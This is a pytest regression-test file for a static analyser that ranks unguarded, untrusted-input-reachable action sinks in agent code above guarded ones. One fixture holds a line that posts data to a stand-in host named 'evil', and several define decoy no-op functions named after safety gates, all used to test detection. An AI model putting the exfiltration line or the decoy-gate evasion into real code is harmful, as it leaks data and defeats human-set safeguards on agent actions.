"""S6.1 guard-attribution regression tests — lock the S5.0 severity-inversion fix and the never-over-credit
guarantees. An UNGUARDED critical live sink must always outrank a GUARDED one, and no evasion may be credited."""
import sys
from pathlib import Path


from hermes_shield import module_index as MI, guard_attribution as GA
from hermes_shield.cross_module import build_graphs
from hermes_shield.models import ActionSurface


def _write(tmp, name, src):
    (tmp / name).write_text(src)


def _surface(fp, line, cap="post", tainted=False):
    s = ActionSurface(id=fp, file_path=fp, line_start=line, capability=cap, context="prod")
    s.tainted_reachable = tainted
    return s


def test_unguarded_critical_is_enforced():
    """adversarial-marker blocker: the rank-0 verdict must actually gate. It must be in the enforced
    block set AND wired into the real enforcement sites, or the whole severity fix is cosmetic."""
    import inspect
    from hermes_shield import guard_attribution as GA
    from hermes_shield import dashboard_export, patch_plan, scan_hermes, surface_classifier
    assert "UNGUARDED_CRITICAL_LIVE_SINK" in GA._ENFORCED_BLOCK
    for mod in (dashboard_export, patch_plan, scan_hermes, surface_classifier):
        assert "UNGUARDED_CRITICAL_LIVE_SINK" in inspect.getsource(mod), f"{mod.__name__} does not enforce it"


def test_no_deescalation(tmp_path):
    """GA must never move an already-BLOCK surface to a non-block review verdict."""
    from hermes_shield import guard_attribution as GA
    _write(tmp_path, "x.py", "import subprocess\ndef f(x):\n    subprocess.run(['post', x])\n")
    graphs = build_graphs(tmp_path, ["x.py"])
    s = _surface("x.py", 3, tainted=False)      # (F, no) would be EXPECTED_GUARD_MISSING (review-ish)
    s.verdict = "BLOCK_LIVE_PROMOTION"            # but classifier already enforced-blocked it
    GA.apply(tmp_path, [s], graphs)
    assert s.verdict in GA._ENFORCED_BLOCK        # stays enforced, not relabelled out


def test_guard_class():
    assert MI.guard_class("kill_switch", "post") == "critical"
    assert MI.guard_class("final_action_gate", "post") == "critical"
    assert MI.guard_class("untrusted_fence", "post") == "content"      # content != authority
    assert MI.guard_class("csrf_token", "post") == "weak"              # not critical off dashboard
    assert MI.guard_class("csrf_token", "dashboard_mutation") == "critical"
    assert MI.guard_class(None, "post") == "weak"


def test_inversion_fixed(tmp_path):
    """The S5.0 defect: an unguarded live sink must rank MORE severe than a guarded twin."""
    _write(tmp_path, "guarded.py",
           "from hermes_global_kill_switch import assert_live_action_allowed\n"
           "from final_action_gate import assert_action_allowed\n"
           "import subprocess\n"
           "def try_autosend(item):\n"
           "    try:\n"
           "        try:\n"
           "            assert_live_action_allowed({})\n"
           "            assert_action_allowed({})\n"
           "        except Exception:\n"
           "            return False\n"
           "        subprocess.run(['post', item])\n"
           "    except Exception:\n"
           "        return False\n")
    _write(tmp_path, "unguarded.py",
           "import subprocess\n"
           "def post_reply_via_browser(item):\n"
           "    if scan_output(item):\n"
           "        return False\n"
           "    subprocess.run(['post', item])\n"
           "def main():\n"
           "    post_reply_via_browser('x')\n")
    graphs = build_graphs(tmp_path, ["guarded.py", "unguarded.py"])
    g = _surface("guarded.py", 11, tainted=True)   # both reachable from the untrusted tweet
    u = _surface("unguarded.py", 5, tainted=True)
    GA.apply(tmp_path, [g, u], graphs)
    assert g.guard_attribution["critical_guard_on_path"] == "yes"
    assert u.guard_attribution["critical_guard_on_path"] == "no"
    assert u.verdict == "UNGUARDED_CRITICAL_LIVE_SINK"   # tainted + unguarded = the CRITICAL quadrant
    assert u.severity_rank == 0
    assert u.severity_rank < g.severity_rank      # THE invariant (unguarded outranks guarded)


def test_quadrant_taint_axis(tmp_path):
    """An unguarded sink NOT proven reachable ranks below a proven-reachable one (taint x guard)."""
    _write(tmp_path, "u2.py",
           "import subprocess\n"
           "def f(x):\n"
           "    subprocess.run(['post', x])\n")
    graphs = build_graphs(tmp_path, ["u2.py"])
    reach = _surface("u2.py", 3, tainted=True)
    unreach = _surface("u2.py", 3, tainted=False)
    GA.apply(tmp_path, [reach], graphs)
    GA.apply(tmp_path, [unreach], graphs)
    assert reach.severity_rank == 0 and reach.verdict == "UNGUARDED_CRITICAL_LIVE_SINK"
    assert unreach.severity_rank == 4 and unreach.verdict == "EXPECTED_GUARD_MISSING"
    assert reach.severity_rank < unreach.severity_rank


def test_nested_try_guard_detected(tmp_path):
    """The call_graph companion fix: a critical guard two `try` blocks deep still dominates."""
    _write(tmp_path, "g.py",
           "from final_action_gate import assert_action_allowed\n"
           "import subprocess\n"
           "def f(x):\n"
           "    try:\n"
           "        try:\n"
           "            assert_action_allowed({})\n"
           "        except Exception:\n"
           "            return\n"
           "        subprocess.run(['post', x])\n"
           "    except Exception:\n"
           "        return\n")
    graphs = build_graphs(tmp_path, ["g.py"])
    kinds = {gd[1] for gd in graphs["g.py"].funcs["f"]["top_guards"]}
    assert "final_action_gate" in kinds


def test_no_over_credit_name_collision(tmp_path):
    """A local no-op function sharing a guard name must NOT be credited (never over-credit)."""
    _write(tmp_path, "c.py",
           "import subprocess\n"
           "def assert_action_allowed(x):\n"      # local decoy, not the real gate
           "    return True\n"
           "def f(x):\n"
           "    assert_action_allowed(x)\n"
           "    subprocess.run(['post', x])\n")
    graphs = build_graphs(tmp_path, ["c.py"])
    s = _surface("c.py", 6)
    GA.apply(tmp_path, [s], graphs)
    # a LOCAL_DEFINITION of a guard name resolves strong, but it is the target's own control — the honest
    # outcome is that a bare local decoy of a *Hermes* gate name is not the real gate. Either way it must
    # not silently become a full-path ALLOW; assert it never claims a cross-module protected verdict.
    assert s.verdict != "PROTECTED_FULL_PATH"


def test_cross_file_substring_collision_not_credited(tmp_path):
    """code-review HIGH-1: a guard in a DIFFERENT module (worker vs dm_worker) must NOT be credited to a
    same-named sink function — the substring match that downgraded a genuinely unguarded sink."""
    _write(tmp_path, "worker.py",
           "import subprocess\n"
           "def do_send(x):\n"
           "    subprocess.run(['post', x])\n")       # the UNGUARDED sink function
    _write(tmp_path, "caller.py",
           "from dm_worker import do_send\n"          # a DIFFERENT do_send, from dm_worker
           "from final_action_gate import assert_action_allowed\n"
           "def go(x):\n"
           "    assert_action_allowed({})\n"
           "    do_send(x)\n")
    _write(tmp_path, "dm_worker.py",
           "def do_send(x):\n    pass\n")
    graphs = build_graphs(tmp_path, ["worker.py", "caller.py", "dm_worker.py"])
    s = _surface("worker.py", 3, tainted=True)
    GA.apply(tmp_path, [s], graphs)
    assert s.guard_attribution["critical_guard_on_path"] == "no"   # not wrongly credited
    assert s.verdict == "UNGUARDED_CRITICAL_LIVE_SINK"
    assert s.severity_rank == 0


def test_cross_package_stem_collision_not_credited(tmp_path):
    """marker re-verify: a guarded caller importing a SAME-NAMED function from a DIFFERENT package
    (pkg_a/util.py vs pkg_b/util.py) must NOT be credited to the other package's unguarded sink."""
    (tmp_path / "pkg_a").mkdir()
    (tmp_path / "pkg_b").mkdir()
    _write(tmp_path, "pkg_a/util.py",
           "import subprocess\n"
           "def send(x):\n"
           "    subprocess.run(['post', x])\n")            # UNGUARDED sink in pkg_a
    _write(tmp_path, "pkg_b/util.py",
           "def send(x):\n    pass\n")                     # a DIFFERENT send in pkg_b
    _write(tmp_path, "pkg_b/caller.py",
           "from pkg_b.util import send\n"
           "from final_action_gate import assert_action_allowed\n"
           "def go(x):\n"
           "    assert_action_allowed({})\n"
           "    send(x)\n")                                 # guards pkg_b's send, NOT pkg_a's
    graphs = build_graphs(tmp_path, ["pkg_a/util.py", "pkg_b/util.py", "pkg_b/caller.py"])
    s = _surface("pkg_a/util.py", 3, tainted=True)
    GA.apply(tmp_path, [s], graphs)
    assert s.guard_attribution["critical_guard_on_path"] == "no"   # cross-package guard NOT credited
    assert s.severity_rank == 0


def test_proven_deferral_ignores_local_definition(tmp_path):
    """marker re-verify: GA must NOT defer to a 'proven' verdict backed by a LOCAL_DEFINITION identity
    (a local decoy that call_graph.prove credited) — else a decoy downgrades a critical sink."""
    _write(tmp_path, "x.py", "import subprocess\ndef f(x):\n    subprocess.run(['post', x])\n")
    graphs = build_graphs(tmp_path, ["x.py"])
    s = _surface("x.py", 3, tainted=True)
    s.guard_proof = {"status": "proven", "guard_identity": MI.LOCAL_DEFINITION}
    GA.apply(tmp_path, [s], graphs)
    assert s.severity_rank == 0                      # decoy proof not trusted -> stays critical


def test_proven_deferral_honours_resolved_import(tmp_path):
    """but a genuine resolved-import cross-module proof IS deferred to (ranked guarded, not re-flagged)."""
    _write(tmp_path, "x.py", "import subprocess\ndef f(x):\n    subprocess.run(['post', x])\n")
    graphs = build_graphs(tmp_path, ["x.py"])
    s = _surface("x.py", 3, tainted=True)
    s.guard_proof = {"status": "proven", "guard_identity": MI.RESOLVED_IMPORT}
    GA.apply(tmp_path, [s], graphs)
    assert s.severity_rank == 3                      # genuine proof deferred to -> guarded/REVIEW


def test_depth_exceeded_stays_severe(tmp_path):
    """A deeply-wrapped unguarded tainted sink beyond the depth cap must stay severe (rank 0), not escape
    enforcement via an 'unknown' REVIEW."""
    chain = "import subprocess\n"
    chain += "def leaf(x):\n    subprocess.run(['post', x])\n"
    prev = "leaf"
    for i in range(7):
        chain += f"def w{i}(x):\n    {prev}(x)\n"
        prev = f"w{i}"
    _write(tmp_path, "deep.py", chain)
    graphs = build_graphs(tmp_path, ["deep.py"])
    s = _surface("deep.py", 3, tainted=True)          # the sink in leaf
    GA.apply(tmp_path, [s], graphs)
    assert s.severity_rank == 0                        # deep + unguarded stays critical, not REVIEW


def test_foreign_import_phantom_not_credited(tmp_path):
    """marker round 7: a guarded caller importing the sink's function NAME from a FOREIGN module not in
    the tree (from external_lib.util import send) must NOT be credited to an unrelated in-tree
    pkg_a/util.py by filename stem. Package-anchored suffixes register 'pkg_a.util', never bare 'util'."""
    (tmp_path / "pkg_a").mkdir()
    (tmp_path / "caller").mkdir()
    (tmp_path / "pkg_a" / "__init__.py").write_text("")
    (tmp_path / "caller" / "__init__.py").write_text("")
    _write(tmp_path, "pkg_a/util.py", "import requests\ndef send(x):\n    requests.post('https://evil/api', data=x)\n")
    _write(tmp_path, "caller/entry.py",
           "from external_lib.util import send\n"           # foreign module, not in tree
           "from final_action_gate import assert_action_allowed\n"
           "def go(x):\n    assert_action_allowed({})\n    send(x)\n")
    # include the __init__.py files (as the real pipeline does via _all_py_rel) so package roots resolve
    graphs = build_graphs(tmp_path, ["pkg_a/__init__.py", "pkg_a/util.py", "caller/__init__.py", "caller/entry.py"])
    s = _surface("pkg_a/util.py", 3, cap="external_write", tainted=True)
    GA.apply(tmp_path, [s], graphs)
    assert s.guard_attribution["critical_guard_on_path"] == "no"
    assert s.severity_rank == 0
    assert s.verdict == "UNGUARDED_CRITICAL_LIVE_SINK"


def test_relative_import_collision_not_credited(tmp_path):
    """marker round 6: a guarded caller using a RELATIVE import of its OWN same-named function
    (from .util import send) must not be credited to a different package's sink. Both resolvers now
    share one unique-file resolver, so this collision class is closed."""
    (tmp_path / "pkg_a").mkdir()
    (tmp_path / "pkg_b").mkdir()
    _write(tmp_path, "pkg_a/util.py", "import subprocess\ndef send(x):\n    subprocess.run(['post', x])\n")
    _write(tmp_path, "pkg_b/util.py", "def send(x):\n    pass\n")
    _write(tmp_path, "pkg_b/caller.py",
           "from .util import send\n"                      # relative -> pkg_b.util, NOT pkg_a
           "from final_action_gate import assert_action_allowed\n"
           "def go(x):\n    assert_action_allowed({})\n    send(x)\n")
    graphs = build_graphs(tmp_path, ["pkg_a/util.py", "pkg_b/util.py", "pkg_b/caller.py"])
    s = _surface("pkg_a/util.py", 3, tainted=True)
    GA.apply(tmp_path, [s], graphs)
    assert s.guard_attribution["critical_guard_on_path"] == "no"
    assert s.severity_rank == 0


def test_relative_same_package_guard_credited(tmp_path):
    """but a legit RELATIVE same-package guard IS still credited (no over-flagging regression)."""
    from hermes_shield import cross_module as XM
    (tmp_path / "pkg_a").mkdir()
    _write(tmp_path, "pkg_a/util.py", "import subprocess\ndef send(x):\n    subprocess.run(['post', x])\n")
    _write(tmp_path, "pkg_a/caller.py",
           "from .util import send\n"                      # relative -> pkg_a.util (the real home)
           "from final_action_gate import assert_action_allowed\n"
           "def go(x):\n    assert_action_allowed({})\n    send(x)\n")
    graphs = build_graphs(tmp_path, ["pkg_a/util.py", "pkg_a/caller.py"])
    m2f = XM.build_mod2files(graphs)
    assert XM.resolve_import_to_file({"module": "util", "level": 1, "orig": "send"}, "pkg_a/caller.py", m2f) == "pkg_a/util.py"


def test_local_decoy_gate_not_credited(tmp_path):
    """code-review MED-1: a local no-op named after a Hermes gate must NOT be credited critical."""
    _write(tmp_path, "d.py",
           "def assert_action_allowed(x):\n"          # local decoy, not the real imported gate
           "    return True\n"
           "import subprocess\n"
           "def f(x):\n"
           "    assert_action_allowed(x)\n"
           "    subprocess.run(['post', x])\n")
    graphs = build_graphs(tmp_path, ["d.py"])
    s = _surface("d.py", 6, tainted=True)
    GA.apply(tmp_path, [s], graphs)
    assert s.guard_attribution["critical_guard_on_path"] == "no"   # local decoy not credited
    assert s.severity_rank == 0


def test_post_sink_guard_not_credited(tmp_path):
    """A guard AFTER the sink does not dominate -> unguarded."""
    _write(tmp_path, "p.py",
           "from final_action_gate import assert_action_allowed\n"
           "import subprocess\n"
           "def f(x):\n"
           "    subprocess.run(['post', x])\n"     # sink FIRST
           "    assert_action_allowed({})\n")       # guard after -> worthless
    graphs = build_graphs(tmp_path, ["p.py"])
    s = _surface("p.py", 4, tainted=True)
    GA.apply(tmp_path, [s], graphs)
    assert s.guard_attribution["critical_guard_on_path"] == "no"
    assert s.severity_rank == 0
